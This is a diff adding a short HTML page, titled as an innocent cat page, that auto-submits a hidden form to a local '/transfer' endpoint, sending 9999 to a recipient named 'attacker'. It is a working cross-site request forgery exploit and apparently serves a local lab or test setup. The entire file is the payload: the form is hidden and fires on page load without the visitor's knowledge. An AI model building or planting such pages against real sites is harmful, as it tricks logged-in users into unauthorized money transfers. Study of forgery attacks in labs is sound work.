@@ -1,0 +1,8 @@
+<!doctype html><html><body>
+<h3>Totally innocent cat page 🐈</h3>
+<form id="f" action="http://127.0.0.1:5000/transfer" method="POST">
+  <input name="recipient" value="attacker">
+  <input name="amount" value="9999">
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
